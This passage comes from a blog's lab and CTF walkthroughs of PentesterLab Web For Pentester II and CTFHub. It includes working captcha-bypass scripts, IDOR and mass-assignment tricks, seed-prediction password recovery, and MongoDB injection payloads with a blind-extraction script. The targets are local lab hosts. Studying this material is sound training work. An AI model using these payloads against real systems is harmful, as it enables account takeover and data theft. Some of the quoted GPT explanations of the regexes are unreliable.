+ pic_src).content img_name = \"captcha6.png\" with open(img_name, \"wb\") as f: f.write(img_data) def img_2_str(filename): cmd = \"tesseract {} {}\" print cmd.format(filename, filename) strs = \"\" try: output = subprocess.check_output(cmd.format(filename, filename), shell=True) with open(filename+\".txt\", \"r\") as f: strs = f.read().strip() return strs except: print \"[-] Error Happend!\" return strs result = img_2_str(img_name) if result != \"\": html = ss.get(login_url.format(result)).text if \"Success\" in html: print \"[+] OK!\" Example 7 可以看到这关的验证码依然很清晰，不过有着蓝色部分的阻碍，这使得我们需要修改脚本，下列是官方说明： 如果我们使用与上述相同的技术，我们可以看到成功率明显较低。为了提高识别度，我们将尝试删除蓝色的“HatchFill”。 一个非常简单的方法是在运行 tesseract 之前使用阈值来修改图像。这可以通过以下代码来完成： require 'RMagick' image = Magick::Image.read(\"current7.png\").first image = image.threshold(THRESHOLD) image.write(\"current7.png\") 您可以使用 THRESHOLD 值来提高检测率。只需使用这个简单的技巧，成功率就会提高。而且，由于 tesseract 检测到的信息符合条件（只有一个由小写字符组成的单词），因此获得此速率所需的时间较短。 不过这里那些师傅也没写出来脚本。。。附上GPT对上述部分代码的解释： 这段代码使用了 Ruby 的 RMagick 库，这是一个用于处理图像的库，可以进行各种图像操作，包括读取、修改和写入图像等。以下是对代码的详细解释： 1. `require 'RMagick'`: 这行代码引入了 RMagick 库，使得代码可以使用该库提供的图像处理功能。在引入之后，你就可以使用 RMagick 中的类和方法了。 2. `image = Magick::Image.read(\"current7.png\").first`: 这行代码通过 `Magick::Image.read` 方法从文件 \"current7.png\" 中读取图像。`Magick::Image.read` 返回一个图像对象的数组，因为一个图像文件可能包含多个图像（比如 GIF 文件中的多帧动画），所以使用 `.first` 选择了数组中的第一个图像对象，并将其赋值给变量 `image`。 3. `image = image.threshold(THRESHOLD)`: 这行代码调用了 `threshold` 方法，该方法用于对图像进行二值化处理，将图像中的像素值转换为二值（黑白）图像。`THRESHOLD` 是一个阈值，用于决定哪些像素被认为是黑色，哪些是白色。这个阈值可能在代码的其他地方被定义，但在提供的代码中并没有给出具体的值。 4. `image.write(\"current7.png\")`: 最后一行代码将处理后的图像写回到文件 \"current7.png\"。这样，原始图像经过二值化处理后的结果就被保存到同一文件中，覆盖了原始图像。 需要注意的是，由于阈值 `THRESHOLD` 没有在提供的代码中定义，你需要确保在实际使用时为其提供一个具体的数值。不同的阈值会导致不同的二值化效果，因此选择适当的阈值对于获得期望的结果非常重要。 看来重点就是threshold部分的处理了 Example 8 这里可以看到又是不清晰的验证码了，我们看一下官方说明 在这里我们可以看到图像被内爆了。我们将打开图像，取消内爆并使用之前的技术来提高成功率。 可以使用以下代码： require 'RMagick' image = Magick::Image.read(\"current8.png\").first image = image.implode(IMPLODE) image = image.threshold(THRESHOLD) image.write(\"current8.png\") 您可以使用 THRESHOLD 和 IMPLODE （ IMPLODE 可以为负）值来提高检测率。 与前面的示例一样，检测率将会提高，并且获得该检测率所需的时间将会减少。 附上GPT对上述代码的解释： 这段代码与之前的代码类似，同样使用了 RMagick 库来处理图像。下面是对这段代码的详细解释： 1. `require 'RMagick'`: 引入了 RMagick 库。 2. `image = Magick::Image.read(\"current8.png\").first`: 通过 `Magick::Image.read` 方法读取名为 \"current8.png\" 的图像文件。与之前的代码一样，选择数组中的第一个图像对象，并将其赋值给变量 `image`。 3. `image = image.implode(IMPLODE)`: 调用了 `implode` 方法，该方法用于实现图像的爆炸效果。`IMPLODE` 是一个参数，用于控制爆炸的程度。和之前的代码一样，该参数并没有在提供的代码中给出具体的值，所以在实际使用时需要提供一个适当的值。 4. `image = image.threshold(THRESHOLD)`: 接下来调用了 `threshold` 方法，对图像进行二值化处理。同样，`THRESHOLD` 是一个阈值，决定了哪些像素被认为是黑色，哪些是白色。该阈值需要在实际使用时提供。 5. `image.write(\"current8.png\")`: 最后一行代码将处理后的图像写回到文件 \"current8.png\" 中，覆盖原始图像。 注意，`IMPLODE` 和 `THRESHOLD` 这两个参数在提供的代码中并没有具体的值，因此在实际使用时需要根据需要定义它们。不同的参数值会产生不同的效果，所以选择适当的值是很关键的。 这个爆炸效果是什么意思呢？ 爆炸效果通常是一种图像处理效果，用于创建一种视觉上的爆炸或扩散效果，使图像中的元素向外扩散或碎裂。这种效果常常用于艺术创作、图形设计、游戏开发等领域，以增加图像的动感和视觉吸引力。 具体来说，在 RMagick 库中，`implode` 方法被用于实现这种爆炸效果。这个方法接受一个参数 `IMPLODE`，用于控制爆炸的程度。当 `IMPLODE` 的值为正时，图像的元素会向内收缩，而当值为负时，图像的元素会向外扩散，产生一种爆炸的效果。 这种效果可以用来创建一些艺术性的图像，或者在设计中为特定元素的突出显示增加一些动态感。在游戏开发中，爆炸效果也经常用于模拟爆炸、碎裂或其他视觉上的破坏效果，提高游戏的视觉吸引力。 总的来说，爆炸效果是一种图像处理手段，通过改变图像元素的位置或形状，创造出一种动感和生动的视觉效果。 奥~~也就是说我们通过设置IMPLODE爆炸程度，可以达到恢复验证码为正常大小。 Example 9 这关是一个算数验证码题，很明显我们编写脚本会很容易，只需要抓取页面算数的部分，调用某些数学库来计算即可。我们看一下官方解释： 该验证码依赖于要求客户端执行简单的算术运算，破解起来非常简单。您可以仅 eval 提供的字符串（可能不是一个好主意），或者您可以编写一个简单的解析器来为您执行算术运算。这种保护可以防止真正愚蠢的机器人，但对于任何会编写一些脚本的人来说，很容易绕过。 附上脚本： import re import requests from bs4 import BeautifulSoup def captcha9(): url = \"http://192.168.246.135/captcha/example9/\" post_url = \"http://192.168.246.135/captcha/example9/submit?captcha={}&amp;submit=Submit\" ss = requests.session() #创建了一个会话对象，用于在多个请求之间保持 cookie。 html = ss.get(url).text #发送 GET 请求获取网页的 HTML 内容，并将结果保存在变量 html 中。 soup = BeautifulSoup(html, \"html.parser\") #使用 BeautifulSoup 解析 HTML。 form = soup.select(\"form\")[0].text #从解析后的 HTML 中选择第一个 &lt;form&gt; 元素，并获取其文本内容。 print((form.strip())) #打印表达式字符串，其中 strip() 用于去除字符串两端的空格和换行符。 #使用正则表达式匹配表达式字符串，提取出形如 \"数字 运算符 数字\" 的部分，并将结果保存在变量 captcha = re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form.strip()) if captcha: #这一部分通过 re.match 的结果对象 captcha 获取匹配的第一个子组（由括号包围的部分）。 result = eval(captcha.group(1)) #使用 eval 函数计算表达式的结果，匹配的是括号中的部分。 html = ss.get(post_url.format(result)).text if \"Success\" in html: print(\"[+] OK\") captcha9() 这个脚本挺简单的，学习一波，顺便问一下GPT上述正则的解释 让我们详细解释一下你提供的正则表达式： ```python re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form.strip()) ``` 1. **`re.match`**: 这是正则表达式模块 `re` 中的 `match` 函数，用于尝试从字符串的开头匹配一个模式。它返回一个匹配对象或 `None`，表示匹配成功或失败。 2. **`r\"`: 这是一个原始字符串（raw string）的前缀。在正则表达式中，使用原始字符串可以避免反斜杠 `\\` 的转义作用，使得正则表达式更清晰。 3. **`(\\d+[+\\-*/]\\d+)`**: 这是一个捕获组，括号内的部分表示一个子表达式，可以通过 `group(1)` 获取。具体解释如下： - **`\\d+`**: 匹配一个或多个数字。 - **`[+\\-*/]`**: 匹配一个加号、减号、乘号或除号。由于减号 `-` 在正则表达式中有特殊含义（表示一个或多个前面的元素），所以需要使用反斜杠 `\\` 进行转义，以保持其原意。这样 `[+\\-*/]` 表示匹配任意一个加号、减号、乘号或除号。 - **`\\d+`**: 再次匹配一个或多个数字。 - **`(\\d+[+\\-*/]\\d+)`**: 整体表示匹配一个数学表达式。 4. **`\\s*`**: 匹配零个或多个空白字符（包括空格、制表符、换行符等）。 5. **`=`**: 匹配等号字符。 6. **`form.strip()`**: 对输入字符串 `form` 进行操作，`strip()` 方法用于去除字符串两端的空白字符（空格、制表符、换行符等），以确保不会因为字符串两端的空格而影响匹配。 整体来说，这个正则表达式的目的是匹配形如 \"数字 运算符 数字\" 的数学表达式，等号前后可能有空白字符。 在此基础上改良一下，使得他可以重复发送http请求 import re import requests from bs4 import BeautifulSoup def captcha9(): url = \"http://192.168.246.135/captcha/example9/\" post_url = \"http://192.168.246.135/captcha/example9/submit?captcha={}&amp;submit=Submit\" ss = requests.session() while True: # 持续发送请求获取网页内容 html = ss.get(url).text soup = BeautifulSoup(html, \"html.parser\") form = soup.select(\"form\")[0].text.strip() print(form) # 使用正则表达式匹配数学表达式 captcha_match = re.match(r\"(\\d+[+\\-*/]\\d+)\\s*=\", form) if captcha_match: expression = captcha_match.group(1) print(\"Expression:\", expression) # 计算数学表达式结果 try: result = eval(expression) print(\"Result:\", result) # 发送包含计算结果的 POST 请求 post_response = ss.get(post_url.format(result)).text if \"Success\" in post_response: print(\"[+] OK \") else: print(\"[-] Error in submitting result \") except Exception as e: print(\"[-] Error in evaluating expression:\", str(e), \" \") if __name__ == \"__main__\": captcha9() 0x05 Authorization-授权 官方说明： 授权问题在 Web 应用程序中非常常见。本节汇总了一些常见的漏洞示例。现代 Web 开发框架通常可以防止各种注入，但无法自动处理此类问题，因为它们无法理解其背后的业务逻辑。出于同样的原因，自动网络扫描仪无法真正测试授权问题；这就是为什么它通常是漏洞的良好来源，并且了解如何测试它们很重要。下面的“批量分配”部分也是一个授权问题，但为了清楚起见，我更喜欢将练习分成两个部分。 Example 1 那我们先登录一下看看 发现了有关user1用户的两个隐私，根据题意我们可以换一个其他浏览器，或者直接注销用户，接着直接访问下隐私的url地址，看看是否要求我们进行用户身份验证。 可见我们并未登录，但仍可以访问uer1用户的隐私 看一手官方说明： 在此示例中，您可以使用以下用户登录： user1 ，密码为“pentesterlab”。登录并尝试后，请注销并尝试访问相同的信息。 对于设计不佳的 Web 应用程序来说，这是一个非常常见的问题，即使您无法访问身份验证后页面，如果您知道其他页面的 URL，您仍然可以访问其他页面：http://vulnerable/authorization/example1/infos/1例如。 Example 2 要求我们访问user2的信息，我们先登陆看看 这里有点懵逼，并不知道要做什么，看一手官方解释 在此示例中，您可以使用以下用户登录： `user1` ，密码为 `pentesterlab` 。登录后，您可以开始访问信息并查看使用的模式： `/infos/1` 、 `/infos/2` 。如果不断增加 URL 中的数字，您就可以访问其他用户的信息。 那我们修改看看 可见我们增加url后面的数字，实现了水平越权 Example 3 我们继续登录看看 如上图，发现多了一个edit编辑的功能 这里有了上一关的经验，我想着直接修改数字1看看 果不其然，这里成为了user2用户 看一手官方说明： 在此示例中，您可以使用类似于前面看到的方法来访问信息。您不能直接访问信息，但是您可以看到您现在可以编辑信息，并且您可以使用此功能仅通过增加 URL 中的数字来访问其他用户的信息。 0x06 Mass Assignment-覆盖属性 官方说明： 当人们开始使用数据库来存储信息来构建网站时，他们必须手动执行大量 SQL。很少有人意识到这不是最好的解决方案，并开始研究更智能的替代方案，并开始构建对象关系映射 (ORM)，以便在没有任何 SQL 知识的情况下轻松查询数据库。例如，在 Ruby（使用 ActiveRecord）中，您可以执行以下操作： @user = User.find_by_name('pentesterlab') 这将自动生成并执行查询，并在 User 对象中检索结果。 另一个非常方便的用法是从哈希自动创建和更新对象： @user = User.create(myhash) [...] @user.update_attributes(anotherhash) 不幸的是，这个有用的功能是有安全代价的，如果开发人员没有正确确保对象 @user 的属性受到保护，攻击者就可以任意覆盖这些属性中的任何一个。在本节中，我们将看到此类问题的一些常见示例： 覆盖属性 Example 1 这里依旧是一脸懵的，还是看一手官方解释吧 在此示例中，您可以注册一个用户。该应用程序有两个级别的权限： User. Admin. 管理员权限是使用对象 user 上的属性 admin 设置的。如果您仔细观察 Web 应用程序使用的格式： user[username] 和 user[password] ，您应该能够找到一种获取 admin 访问权限的方法。可以使用三种方法： 使用浏览器扩展直接修改页面。 保存页面并离线修改以创建一个页面，该页面将正确的负载发送到正确的 URL。 使用代理拦截合法请求并添加您的参数（最快的选项）。 一开始看这个解释并不清楚是干嘛的，于是看了师傅们的wp才理解。根据之前官方的解释，这里极有可能是服务器会对用户在url输入的内容进行检索，我们抓包看一下数据结构 可以看到是user[username]与user[password]结构，这意味着服务器就是通过检索url中user中键值名为username与password对应的值。也就是说我们可以尝试在url中添加：user[admin]的参数。 如上图，这里我添加了user[admin]=1，可以看到成功越权 Example 2 这里目的相同，不过我们在创建的时候无法添加admin属性了 但这里多了一个功能，我们可以进行更新 在此url下我们继续提交看看 发现这里变成更新了，那我们有理由相信，这位开发人员只在登录的时候进行了限制，但其他接口忘记修改了。那这样的话我们在此尝试添加admin属性看看 成功越权 Example 3 我们先尝试登录 这里说公司一的用户是无权访问公司2的秘密的，但这里我们可以看到有一个modify的新功能，不出所料这里或许是漏洞所在点 我们点击在输入框输入信息后发现url成为了updateprofile，那大概率如果我们在此添加一些属性，也许就可以绕过，但我测试了几番发现总是错误。让我们看一下官方说明： 在本练习中，您可以使用以下用户登录： user1 ，密码为 pentesterlab 。登录后，尝试访问“Company 2”公司的信息。 为此，您需要使用批量分配来修改您的公司。 按照约定（可以通过编程方式更改），当开发人员使用 ActiveRecord（Ruby-on-Rails 最常见的数据映射器）并且类 Company 具有多个 User 时，关系将受到管理在 User 类中的字段 company_id ： 在 Ruby 中使用以下代码： class User &lt; ActiveRecord::Base belongs_to :company end class Company &lt; ActiveRecord::Base has_many :users end Ruby-on-Rails 强制执行“约定”而不是“配置”，这确实有助于猜测类名称和属性名称...... 使用此信息，您应该能够修改您当前的公司以获取其他公司的“秘密”。获得此“秘密”后，您可以重置 company_id 以返回您公司的详细信息。 附上GPT对上述代码的解释 这段 Ruby 代码展示了两个 ActiveRecord 模型类，分别是 `User` 和 `Company`。ActiveRecord 是 Ruby on Rails 中的 ORM（对象关系映射）框架，用于在 Ruby 中操作数据库。 1. User 模型类: ```ruby class User &lt; ActiveRecord::Base belongs_to :company end ``` - `User` 类继承自 `ActiveRecord::Base`，表示它是一个 ActiveRecord 模型。 - `belongs_to :company` 表明 `User` 模型属于（关联到）`Company` 模型。这是一对多关系的一端，即一个公司可以有多个用户，而每个用户只属于一个公司。 2. Company 模型类: ```ruby class Company &lt; ActiveRecord::Base has_many :users end ``` - `Company` 类同样继承自 `ActiveRecord::Base`，表示它是一个 ActiveRecord 模型。 - `has_many :users` 表明 `Company` 模型拥有（关联到）多个 `User` 模型。这是一对多关系的多端，即一个公司可以拥有多个用户。 这两个类的定义反映了数据库中两个表之间的关系。通常，这种关系被称为 \"一对多\"（One-to-Many）关系，其中一个对象（Company）可以关联到多个其他对象（Users），而这些其他对象（Users）只能属于一个特定的对象（Company）。 在 Rails 中，这样的关联关系还可以带来一些便捷的方法，比如通过 `company.users` 可以获取与某个公司关联的所有用户，通过 `user.company` 可以获取某个用户所属的公司。这些关联关系可以方便地进行数据库查询和操作，遵循 Rails 的约定优于配置（Convention over Configuration）原则。 但此处的当开发人员使用 ActiveRecord（Ruby-on-Rails 最常见的数据映射器）这个映射器我们从何验证呢，只需要一个小插件即可 总结：因为在一对多的结构中，即一个company对应多个user，那么在user表中会多一个company_id的外键指向company表。 这也就是说我们可以从刚才的页面添加一个compan_id的属性即可，而之前我在测试的时候添加的是company属性 如下图，我们成功读取公司一的秘密 0x07 Randomness Issues-随机性问题 官方说明： 根据开发人员生成随机数或字符串的方式，所创建的值或多或少都是随机的。最大的错误便是使用常量或当前时间手动设置随机生成器;这将允许攻击者能够预测已经和将要生成的值。 在本节中，我们将看到一些示例，这些示例将使您相信随机并不总是随机的。 Example 1 附上GPT对上述代码的解释： 这段 Ruby 代码主要涉及随机密码生成和创建用户的操作，同时使用了 MD5 哈希来存储密码。以下是对代码的详细解释： 1. **`Random.new(0)`**: 创建了一个新的伪随机数生成器对象，并使用种子值 `0` 进行初始化。这个对象将用于生成密码中的随机字符。 2. **`6.times.map {...}.join`**: 这个部分生成了一个包含 6 个随机小写字母的字符串。具体解释如下： - `6.times`: 表示循环 6 次。 - `map {...}`: 对每次循环应用花括号中的代码块，并将结果存储在数组中。 - `('a'..'z').to_a`: 创建包含小写字母 'a' 到 'z' 的数组。 - `s.rand(('a'..'z').to_a.size)`: 生成一个介于 0 和数组大小之间的随机数。 - 整体来说，`('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]` 会随机选择数组中的一个字母。 - `.join`: 将数组中的元素拼接成一个字符串。 3. **`Digest::MD5.hexdigest(SEED+pass+SEED)`**: 使用 MD5 哈希算法对密码进行哈希。`Digest::MD5.hexdigest` 将生成一个 32 位的十六进制哈希值。`SEED` 是一个预定义的常量，被拼接到密码的前后，这样可以增加哈希的安全性，防止彩虹表等攻击。 4. **`User.create(...)`**: 使用 ActiveRecord 模型 `User` 的 `create` 方法创建用户。具体解释如下： - `:username =&gt; 'admin'`: 指定用户名为 'admin'。 - `:password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)`: 指定密码为通过 MD5 哈希处理的随机生成的密码。 5. **`pass = 6.times.map {...}.join`**: 生成另一个 6 位的随机密码，用于创建第二个用户。 6. **`User.create(...)`**: 创建第二个用户，用户名为 'hacker'，密码同样是通过 MD5 哈希处理的随机生成的密码。 总体来说，这段代码用于创建两个用户，一个用户名为 'admin'，另一个用户名为 'hacker'，并为这两个用户生成随机密码，通过 MD5 哈希存储密码。在实际应用中，使用更强大的密码哈希算法（如 bcrypt）通常是更安全的选择。此外，硬编码的密码和种子值可能不是最佳实践，更好的方式是使用更随机和更长的密码以及真正的随机数生成器。 也就是说这里面用户的密码是随机生成的，但我们可以看到其中的随机数种子s=Random.new(0)似乎并不安全，这里以0为随机数种子，这代表着此处的s一定是定值，并且在进行md5加密时，采用了预定义常量MD5.hexdigest(SEED+pass+SEED))SEED 我们看一下官方说明： 第一个例子只是为了说明随机性并不是真正的随机性。问题来自于种子随机生成器的使用。开发人员使用值 0 来为随机生成器提供种子。 如果您只是重新执行该脚本，您应该能够找到为管理员 admin 生成的密码。 之后看了几个wp发现直接运行此代码即可 s = Random.new(0) pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join puts pass pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join puts pass 但令我疑惑的是password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)此处的password起到了什么作用啊。难道不应该是puts password吗？于是问了GPT，这里附上解释： 是的，你理解得很对。在这段 Ruby 代码中，`password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)` 中的 `password` 只是用于存储密码的字段，实际存储的是通过 MD5 哈希算法处理过的密码的结果，而不是用户真正的明文密码。 在典型的安全实践中，用户的密码是不直接以明文形式存储在数据库中的，而是通过哈希算法加盐处理后存储。这样即使数据库泄漏，攻击者也不能轻易获取用户的真实密码。盐值（`SEED` 在这里就是一种盐值）是一个额外的随机字符串，通过与用户密码结合，增加了哈希的随机性和安全性。 需要注意的是，MD5 已经不再被认为是足够安全的哈希算法，因为它容易受到碰撞攻击。在实际应用中，推荐使用更强大和安全的哈希算法，如 SHA-256 或 SHA-3，并且结合足够长、随机的盐值来存储用户密码。 那我们找一个Ruby的在线运行工具运行一下即可 如上图，多次尝试你会发现，右侧结果不会改变，那admin的密码就是第一个了，如下图success Example 2 在这里呢与上一关相似，只不过随机数种子换为了当前时间戳。这令我头疼，我以为页面会在某处泄露一下时间的，但我找不到，那看一下官方说明吧 此示例显示了随机生成器播种不良的另一个示例。随机生成器以当前时间为种子。 要获取 admin 密码，您需要暴力破解种子。为此，您可以从当前时间开始并减少时间，同时重新执行用于生成值的算法，直到获得密码。 一旦获得密码，您就知道使用了什么种子（或者更准确地说，随机生成器初始化的时间）。然后您可以获得 admin 密码。 原来如此，学到了，不过我这都2023年了，爆破估计很费事，这里先贴上大佬的脚本让他自己先去爆破吧 timestamp = (Time.now.to_f).to_i seed = Random.new(timestamp) pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join while pass_hacker !=\"efefsk\" do #contraseña del usuario 'hacker' timestamp = timestamp - 1 seed = Random.new(timestamp) pass_admin = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[seed.rand(('a'..'z').to_a.size)]}.join end puts \"Password de admin: \" puts pass_admin 最终也是成功爆破出来 Example 3 这里看到s恢复了以0位随机数种子，但生成密码的时候出现了6+s.rand(5)这似乎是随机增加了密码的位数，这似乎增加了爆破难度，让我们看看官方说明 这个例子非常简单并且与第一个例子类似。您只需重播代码即可获取 admin 密码。密码长度是随机的这一事实并不影响您可以猜测它。 尴尬，原来如此简单，如下图成功爆破 Example 4 这一关多了一条代码，我们看看GPT如何解释： 这段 Ruby 代码的目的是使用 `Random.new(0)` 创建一个伪随机数生成器对象，并在该对象上进行随机数的生成操作。以下是对代码的详细解释： 1. `s = Random.new(0)`: 创建一个新的伪随机数生成器对象，并使用种子值 `0` 进行初始化。这个对象将用于生成随机数序列。 2. `rand(1000).times {s.rand(5)}`: - `rand(1000)`: 生成一个介于 0 和 999 之间的随机整数。`rand` 方法用于生成伪随机数，默认范围是 [0, 1)，通过传递参数可以指定范围。 - `.times {s.rand(5)}`: 针对生成的整数值执行代码块，该代码块中使用 `s.rand(5)` 生成 0 到 4 之间的随机整数，实际上并没有对这些生成的随机数进行进一步的操作。 总的来说，这段代码创建了一个伪随机数生成器对象 `s`，然后生成一个介于 0 和 999 之间的随机整数，接着对该整数进行循环（`rand(1000).times`），在每次循环中生成 0 到 4 之间的随机整数。在这里，循环的目的似乎只是为了产生一系列随机数而没有直接使用它们。 这里看的解释还是有点懵，我们看看官方如何说： 在此示例中，您不知道在生成密码之前使用了多少次随机生成器（因为它是对 rand(1000) 的调用，而不是 s.rand(1000) 。您仍然可以获得之前生成的密码。要获取它，您只需暴力破解该值，直到获得密码。 这里似乎就理解了，上述rand(1000).times {s.rand(5)}的作用似乎是令s = Random.new(0)执行rand(1000).times次，但这里我们并不知道在此之前s = Random.new(0)执行过几次，但我们仍然是可以进行暴力破解来获取密码的，只需要重复执行题目给我们的源码即可，让我们根据Example 2的脚本进行简单修改即可 s = Random.new(0) rand(1000).times {s.rand(5)} pass_admin = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join while pass_hacker != \"udxpnv\" do s = Random.new(0) rand(1000).times {s.rand(5)} pass_admin = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join pass_hacker = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join end puts \"Password de admin: \" puts pass_admin 最终也是成功爆出 成功登录 0x08 MongoDB 注入 官方说明： 即使 MongoDB 是 NoSQL 数据库，仍然有可能编写易受攻击的代码，因此本练习具有两个 NoSQL 注入。 如果您想自己尝试，请尝试按照以下步骤操作： 学习并理解 MongoDB 语法是什么样的（找到项目的网站并阅读文档）。 查找可用于删除注入点之后的代码的内容（注释、空字节）。 了解如何生成始终 true 条件（例如 1）。 了解如何检索信息（例如 2）。 与几乎支持相同语法的 SQL 数据库相反，NoSQL 数据库具有不同的语法。 Example 1 一个熟悉的登录框，这里测试了一下，发现在hacker后面添加单引号会报错，但报错出来的东西似乎也没什么信息，这里还是看了答案才知道如何做的。 但官方提示我们：了解如何生成始终 true 条件（例如 1）。那例子1就是考察万能密码绕过，或者叫nosql永真式注入，但我翻了翻笔记，发现与这一关的通关技巧还不一样，先展示一下官方手法： 这个例子是著名的 ' or 1=1 -- 的 MongoDB 版本。如果您还记得之前看到的内容，您就会知道需要做两件事才能绕过此登录： 始终真实的条件。 一种正确终止 NoSQL 查询的方法。 首先，通过阅读 MongoDB 文档，您可以发现 SQL or 1=1 转换为 || 1==1 （注意双 = ）。然后通过查看，您可以看到 NULL BYTE 将阻止 MongoDB 使用查询的其余部分。您还可以使用注释 // 或 &lt;!-- 注释掉查询的末尾。 有了这些信息，您应该能够绕过身份验证表单。 也就是说我们将username赋值为hacker' || 1==1//或者hacker' || 1==1&lt;!--或者hacker' || 1// Example 2 这一关是让我们了解如何检索信息 但我也不清楚后台语句，有点蒙蔽的，看了答案发现有点难啊，这些语句都没咋见过。。。这里就跟着wp走了 在第二个也是最后一个练习中，我们必须通过操作 GET 请求来获取管理员密码。 使用以下 URL，无论密码如何，都会显示名为“admin”的用户： ?search=admin' &amp;&amp; this.password.match(/./) 现在，如果我们更改“/ /”之间的值，我们可以“猜测”密码字符，因为如果该字符在密码中，则将显示管理信息，如果不是，则不会恢复任何内容，如下所示： ?search=admin' &amp;&amp; this.password.match(/k/) 说白了这里就是根据页面回显情况，判断出需要利用盲注的手段，不过这里的正则匹配没见过。。。。真不知道这是什么语言写的，下去有时间得好好复习了 不过这里的payload似乎需要url编码一下 &amp;&amp; 编码为%26%26 其中最后的// 类似于sql中的–-即注释作用。而%00 空字符也可以阻止后边的执行。 还可以加上正则中的 ^ $ 分别限定。 如果成功，则返回结果，如果false，则无结果返回。 脚本如下： 那毫无疑问得写脚本了，继续向佬们学习写脚本，看了看发现逻辑很简单，试着编写一下 import requests import string strs = string.ascii_letters + string.digits url = 'http://192.168.246.135/mongodb/example2/?search=admin%27%26%26this.password.match(/^{}$/)//+%00' passwords = \"\" while True: for c in strs: tmp = passwords + c html = requests.get(url.format(tmp +'.*')) if \"admin\" in html.text: passwords += c print(\"Find a key:{}\".format(passwords)) break 最终爆出密码如下： 这里附上GPT对上述正则的解释（这里不必在乎他对{}的解释） 正则表达式 `this.password.match(/^{}.*$/)` 在匹配字符串时有一些问题。首先，`{}` 是一个特殊字符，表示一个空的量词（quantifier），用于指定前面的字符或子表达式的重复次数。如果你想匹配字符串中包含的实际的 `{}` 字符，你需要对其进行转义，即写成 `\\{\\}`。 然后，这个正则表达式的具体含义是： - `^`: 匹配字符串的开头。 - `\\{\\}`: 匹配实际的 `{}` 字符。 - `.*`: 匹配任意数量的任意字符（除了换行符），`.*` 表示零个或多个任意字符。 - `$`: 匹配字符串的结尾。 因此，这个正则表达式的意思是匹配以 `{}` 开头，并且后面可以有任意字符的字符串，直到字符串的结尾。 如果你想要匹配包含 `{}` 的字符串，并且 `{}` 之间至少有一个或多个字符，你可以使用正则表达式 `\\{\\}.*\\{\\}`。这个正则表达式的含义是匹配以 `{}` 开头，并且后面至少有一个或多个字符，然后再跟着 `{}`，即 `{}` 之间至少有一个或多个字符。 所以这里的.*与^和$配合，是为了保证我们从密码的第一位字符开始匹配至最后一位，而不会造成匹配密码的中间某些字符的情况出现 0x09 后言 这个练习也是收获良多，但同时让我明白了我之前的学的web基础漏洞知识仍然有所欠缺，日后会坚持刷一些web靶场，以及红队靶场，只能说感觉时间好紧张，目前的我仍然认为自己掌握的就是一坨答辩，真的很糟心。对此先不吐槽了，还是抓紧时间学习吧~~，之后再把这个靶场的第一个版本刷一下，就正式完结了。 0x10 参考文章 CTF靶场系列-Pentester Lab: Web For Pentester II web_for_pentest_II writeup 官方解释 【技术分享】Web for Pentester II练习题解 [Pentesterlab write-up] Web For Pentester II - Randomness Issues &amp; MongoDB injection nosql参考：Nosql 注入从零到一 --感觉挺不错，日后有机会在好好学学","tags":["web渗透"],"categories":["PentesterLab系列"]},{"title":"CTFHub系列","path":"/2023/12/12/ctfhub-xi-lie/","content":"0x00 Web Web前置技能 HTTP协议-请求方式 题目描述：HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。 提示:如果你得到“HTTP方法不允许”错误，你应该请求index.php。 这里不知道请求的含义，还是看了wp才明白的。。。先说结果，这里说是http请求方法是可以自定义的，那题目让我们使用CTFHUB方法来请求index.php页面，这里我先用bp抓包修改了 如图拿到flag，不过wp是通过curl的方法来请求的 curl -v -X CTFHUB http://challenge-c76d77da5e3e2f67.sandbox.ctfhub.com:10800/index.php HTTP协议-302跳转 一个超链接，点击一下看源代码 发现是要跳转到index.php页面的，但我们实际上是跳转到了index.html，这里就是被重定向了，bp截一手 成功拿到，当然这里依旧可以用curl命令来访问index.php HTTP协议-Cookie 这里说只有admin用户能拿到flag，我们需要伪造cookie bp抓包发现admin=0，直觉改为1即可 拿到flag HTTP协议-基础认证 这里我们点击之后需要输入账户密码 如上图输入之后bp抓包看看 这意味着我们需要爆破了 这里还提示我们你知道admin吗，那说明用户名大概率就是admin了 发送到bp的爆破模块开始爆破 Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin: Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode Payload Encode 取消勾选 URL-encode, 不然你会看到 base64 之后的 = 会被转成 %3d ，你就算爆破到天荒地老也不会出来 找到flag 这里了解一下HTTP基础认证： 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。 HTTP-响应包源代码 直接右键源代码查看得到 信息泄露 目录遍历 根据题目提示直接点击目录找即可 PHPINFO phpinfo() 是php中查看相关信息的函数，当在页面中执行phpinfo()函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息： 例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等，在phpinfo中获得的这些信息会为下一步的渗透/做题提供一些帮助 点击查看phpinfo，全局搜索flag，在环境变量中找到lfag 备份文件下载 网站源码 题目描述：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。 访问www.zip得到了一个压缩包 根据提示让我们估计是让我们访问该文件 拿到flag bak文件 有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码 